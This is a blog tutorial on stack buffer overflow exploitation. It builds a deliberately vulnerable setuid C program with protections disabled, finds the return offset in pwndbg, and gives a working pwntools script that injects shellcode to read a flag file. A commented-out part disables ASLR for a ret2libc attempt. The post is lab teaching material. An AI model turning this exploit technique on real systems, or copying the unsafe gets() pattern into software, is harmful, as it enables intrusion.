---
author: pl4int3xt
layout: post
title: Buffer overfl0w 02
date: '2024-01-11'
description: "Learn more basic techniques of exploiting buffer overflows in binaries"
categories: [Binary Exploitation 101]
tags: [Buffer overflow, binary exploitation]
---

## shellc0de in the fall0ut
A buffer overflow can allow us to inject our own code and make it execute incase we do not find any interesting function to jump to or variables to overwrite. We will use the code below to demonstrate the injection process.

```c
#include <stdio.h>

int jumper() {
    asm("jmp %rsp");
}

void fallout(){
    char buffer[64];

    puts("Welcome to the fallout");
    gets(buffer);
}

int main(){
    setuid(0);
    setgid(0);
    fallout();
    return 0;
}
```

Let's compile our code and remove some protections that might prevent us from executing the shellcode.

```shell
gcc fallout.c -o fallout -fno-stack-protector -z execstack -no-pie
```

All we need is to overflow the buffer in the `fallout()` and jump to rsp which will cause us to jump to the stack containing the rest of the shellcode which we overflowed, the program will then start executing the malicious code. Let's find the offset.

```shell
pl4int3xt@archlinux ~/D/p/shellcode> pwndbg ./fallout
Reading symbols from ./fallout...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.archlinux.org>
Enable debuginfod for this session? (y or [n]) 
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in ./fallout)
Cannot convert between character sets `UTF-32' and `UTF-8'
pwndbg: loaded 147 pwndbg commands and 44 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
GDB and Pwndbg parameters can be shown or set with show <param> and set <param> <value> GDB commands
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg>
```

Let's run the program with the values from cyclic

```shell
pwndbg> run
Starting program: /home/pl4int3xt/Documents/pwn/shellcode/fallout 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Welcome to the fallout
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
```

The executable with crash and we will be able to see this as part of the REGISTERS output

```shell
*R13  0x7fffffffe728 —▸ 0x7fffffffea46 ◂— 'PWD=/home/pl4int3xt/Documents/pwn/shellcode'
*R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*R15  0x403df0 —▸ 0x401120 ◂— endbr64 
*RBP  0x6161616161616169 ('iaaaaaaa')
*RSP  0x7fffffffe5f8 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x401189 (fallout+42) ◂— ret
```

Let's get the first 8 characters of RSP `jaaaaaaaa` and get the offset

```shell
pwndbg> cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

We need 72 bytes to write the return address to jump and execute our shellcode. Let's create a python script to execute our shellcode.

```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './fallout'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# Start the executable
io = start()

# How many bytes to the instruction pointer (RIP)?
padding = 72

jmp_rsp = asm('jmp rsp')
jmp_rsp = next(elf.search(jmp_rsp))

shellcode = asm(shellcraft.cat('message.txt'))

shellcode += asm(shellcraft.exit())

payload = flat(
    asm('nop') * padding,
    jmp_rsp,
    asm('nop') * 16,
    shellcode
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b'>', payload)

# Receive the flag
io.interactive()
```

Let's run our shellcraft code
```shell
pl4int3xt@archlinux ~/D/p/shellcode> python3 shellcraft.py
[+] Starting local process './fallout': pid 86826
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    jmp rsp
[DEBUG] /sbin/as -64 -o /tmp/pwn-asm-hxdxjjco/step2 /tmp/pwn-asm-hxdxjjco/step1
[DEBUG] /sbin/objcopy -j .shellcode -Obinary /tmp/pwn-asm-hxdxjjco/step3 /tmp/pwn-asm-hxdxjjco/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* push b'message.txt\x00' */
        push 0x1010101 ^ 0x747874
        xor dword ptr [rsp], 0x1010101
        mov rax, 0x2e6567617373656d
        push rax
        /* call open('rsp', 'O_RDONLY', 'rdx') */
        push 2 /* 2 */
        pop rax
        mov rdi, rsp
        xor esi, esi /* O_RDONLY */
        syscall
        /* call sendfile(1, 'rax', 0, 0x7fffffff) */
        mov r10d, 0x7fffffff
        mov rsi, rax
        push 40 /* 0x28 */
        pop rax
        push 1
        pop rdi
        cdq /* rdx=0 */
        syscall
[DEBUG] /sbin/as -64 -o /tmp/pwn-asm-e332noer/step2 /tmp/pwn-asm-e332noer/step1
[DEBUG] /sbin/objcopy -j .shellcode -Obinary /tmp/pwn-asm-e332noer/step3 /tmp/pwn-asm-e332noer/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        /* exit(status=0) */
        xor edi, edi /* 0 */
        /* call exit() */
        push 60 /* 0x3c */
        pop rax
        syscall
[DEBUG] /sbin/as -64 -o /tmp/pwn-asm-l4rclyu_/step2 /tmp/pwn-asm-l4rclyu_/step1
[DEBUG] /sbin/objcopy -j .shellcode -Obinary /tmp/pwn-asm-l4rclyu_/step3 /tmp/pwn-asm-l4rclyu_/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    nop
[DEBUG] /sbin/as -64 -o /tmp/pwn-asm-gyxdakhl/step2 /tmp/pwn-asm-gyxdakhl/step1
[DEBUG] /sbin/objcopy -j .shellcode -Obinary /tmp/pwn-asm-gyxdakhl/step3 /tmp/pwn-asm-gyxdakhl/step4
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/lib/python3.11/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
    nop
[DEBUG] /sbin/as -64 -o /tmp/pwn-asm-k7b0o8nu/step2 /tmp/pwn-asm-k7b0o8nu/step1
[DEBUG] /sbin/objcopy -j .shellcode -Obinary /tmp/pwn-asm-k7b0o8nu/step3 /tmp/pwn-asm-k7b0o8nu/step4
[DEBUG] Received 0x34 bytes:
    b'Welcome to the fallout, we have a message for you >\n'
[DEBUG] Sent 0x9b bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000040  90 90 90 90  90 90 90 90  5a 11 40 00  00 00 00 00  │····│····│Z·@·│····│
    00000050  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    00000060  68 75 79 75  01 81 34 24  01 01 01 01  48 b8 6d 65  │huyu│··4$│····│H·me│
    00000070  73 73 61 67  65 2e 50 6a  02 58 48 89  e7 31 f6 0f  │ssag│e.Pj│·XH·│·1··│
    00000080  05 41 ba ff  ff ff 7f 48  89 c6 6a 28  58 6a 01 5f  │·A··│···H│··j(│Xj·_│
    00000090  99 0f 05 31  ff 6a 3c 58  0f 05 0a                  │···1│·j<X│···│
    0000009b
[*] Switching to interactive mode

[*] Process './fallout' stopped with exit code 0 (pid 86826)
[DEBUG] Received 0x17 bytes:
    b'w3lc0me_t0_th3_f4ll0u7\n'
w3lc0me_t0_th3_f4ll0u7
[*] Got EOF while reading in interactive
$
```

We successfully executed our malicious shellcode.

<!-- ## NX Enabl3d
When we enable NX our pevious script won't execute the shellcode. Let's compile our previous fallout code without execstack option

```c
#include <stdio.h>

void fallout(){
    char buffer[64];

    puts("Welcome to fallout >");
    gets(buffer);
}

int main(){
    setuid(0);
    setgid(0);
    fallout();
    return 0;
}
```
```shell
gcc fallout.c -o fall0ut -fno-stack-protector -no-pie
```
Running checksec we realize that NX is enabled
```shell
pl4int3xt@archlinux ~/D/p/shellcode> checksec --file=fall0ut
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	  Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   29 Symbols	 No	fall0ut
```

Our code is dynamically linked. This means that the code does not include the libc functions in the binary but instead uses the ones in the host machine. 

Whenever the code wants to access those functions, it will first look for the functions in the `global offset table`. The table contains the address of the libc functions on the system. This means we can return to functions in libc such as `system()` and strings such as `/bin/sh`. The libc in our system has a protection `aslr` that randomizes the addresses of binaries to prevent buffer overflow attacks. Let's first disable it 

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Running ldd we get the fixed base address of the libc library.

```
pl4int3xt@archlinux ~/D/p/shellcode> ldd fall0ut
	linux-vdso.so.1 (0x00007ffff7fc8000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7dc2000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fca000)
```


```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './fallout'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# Start the executable
io = start()

# How many bytes to the instruction pointer (RIP)?
padding = 72

jmp_rsp = asm('jmp rsp')
jmp_rsp = next(elf.search(jmp_rsp))

shellcode = asm(shellcraft.cat('message.txt'))

shellcode += asm(shellcraft.exit())

payload = flat(
    asm('nop') * padding,
    jmp_rsp,
    asm('nop') * 16,
    shellcode
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b'>', payload)

# Receive the flag
io.interactive()
``` -->
